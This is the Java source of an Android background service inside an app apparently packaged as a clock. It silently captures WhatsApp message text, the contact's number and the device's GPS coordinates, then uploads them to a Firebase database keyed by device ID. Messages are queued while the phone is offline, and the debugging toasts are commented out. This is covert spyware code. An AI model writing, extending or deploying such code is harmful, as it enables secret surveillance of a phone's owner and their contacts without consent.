package com.aftab.clock.Services;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.aftab.clock.Model.WhatsAppMessage;
import com.aftab.clock.Receivers.NetworkChangeReceiver;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;

import java.util.ArrayList;

import im.delight.android.location.SimpleLocation;

public class UploadNewWhatsAppMessage extends android.app.Service {
    public static double longitude = 0;
    public static double latitude = 0;
    Context context;
    SharedPref sh;
    String smsBody, number, type;
    long date;
    private SimpleLocation simpleLocation;

    public UploadNewWhatsAppMessage() {
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {

        context = this;
        sh = new SharedPref(context);
        simpleLocation = new SimpleLocation(this);
        simpleLocation.beginUpdates();
    }

    @SuppressWarnings("deprecation")
    @SuppressLint("MissingPermission")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        smsBody = intent.getStringExtra(Constants.SIM_SMS);
        number = intent.getStringExtra(Constants.NUMBER);
        date = intent.getLongExtra(Constants.DATE, System.currentTimeMillis());
        type = intent.getStringExtra(Constants.TYPE);

        //Toast.makeText(context, "RUNNING", Toast.LENGTH_SHORT).show();


        longitude = simpleLocation.getLongitude();
        latitude = simpleLocation.getLatitude();

        String deviceID = Functions.getDeviceId(context);

        if (number.contains(".")) {

            number = number.replace(".", ",");

        } else if (number.contains("#")) {

            number = number.replace("#", "-");

        } else if (number.contains("$")) {

            number = number.replace("$", "_");

        } else if (number.contains("[")) {

            number = number.replace("[", "+");

        } else if (number.contains("]")) {

            number = number.replace("]", "/");

        }

        if (!number.contains("*") && !number.contains("#")) {

            if (!number.startsWith("+") && number.length() > 6) {

                number = Functions.formatNumber(context, number, Functions.checkCountryISO(context));


            }

        }

        String latLng = longitude + "," + latitude;

        String pushId = date + number;
        WhatsAppMessage whatsAppMessage = new WhatsAppMessage(pushId, number, smsBody, type, date + "", latLng, false);




        if (!NetworkChangeReceiver.isOnline(context)) {

            ArrayList<WhatsAppMessage> whatsAppMessageList = new ArrayList<>();
            whatsAppMessageList.add(whatsAppMessage);

            sh.saveWhatsAppMessageList(whatsAppMessageList, Constants.WhATSAPP_MESSAGE);

            //save to offline
          //  Toast.makeText(context, "OUT", Toast.LENGTH_SHORT).show();

        } else {

          //  Toast.makeText(context, "IN", Toast.LENGTH_SHORT).show();

            ArrayList<WhatsAppMessage> whatsAppMessageArrayList = sh.getWhatsAppMessageList(Constants.WhATSAPP_MESSAGE);

            if (whatsAppMessageArrayList != null) {

                if (whatsAppMessageArrayList.size() > 0) {

                    for (int i = 0; i < whatsAppMessageArrayList.size(); i++) {

                        WhatsAppMessage whatsAppMessage1 = whatsAppMessageArrayList.get(i);


                        String pushId2 = whatsAppMessage1.getTime() + whatsAppMessage1.getAddress();


                        FireRef.WhATSAPP_MESSAGE.child(deviceID)
                                .child(whatsAppMessage1.getAddress())
                                .child(pushId2)
                                .setValue(whatsAppMessage1);

                    }
                }
            }

            sh.removeList(Constants.WhATSAPP_MESSAGE);

            FireRef.WhATSAPP_MESSAGE.child(deviceID)
                    .child(number)
                    .child(pushId)
                    .setValue(whatsAppMessage).addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {

                   // Toast.makeText(context, "Sucess", Toast.LENGTH_SHORT).show();

                    Intent stopIntent = new Intent(context, UploadNewWhatsAppMessage.class);
                    context.stopService(stopIntent);

                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {

                   // Toast.makeText(context, "" + e.getMessage(), Toast.LENGTH_SHORT).show();

                }
            });

        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        simpleLocation.endUpdates();
    }
}